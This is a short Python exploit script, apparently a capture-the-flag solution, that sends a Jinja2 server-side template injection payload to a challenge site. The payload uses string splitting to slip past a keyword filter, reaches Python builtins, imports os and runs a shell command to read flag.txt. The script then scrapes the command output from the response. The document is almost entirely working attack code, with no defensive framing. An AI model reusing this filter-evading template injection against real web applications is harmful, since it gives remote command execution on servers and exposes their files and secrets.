import requests
import re

url = 'https://signal-lost.asrctf.online'

payload = """
{% set a = [] | attr('_'~'_reduce_ex_'~'_') %}
{% set a = a(3)[0] | attr('_'~'_bui'~'ltins_'~'_') %}
{% set a = a['_'~'_imp'~'ort_'~'_']('o'~'s') | attr('po'~'pen') %}
{% set a = a('cat flag.txt') | attr('re'~'ad') %}
{{ a() }}
"""

res = requests.post(f'{url}/send_signal', data={
    'title': 'a',
    'payload': payload
})

assert 'intercepted malicious' not in res.text.lower()

try:
    leak = re.findall(r'Received:(.+?)<', res.text.replace('\n', ''))[0].strip()
    print(leak)
except:
    print(res.text)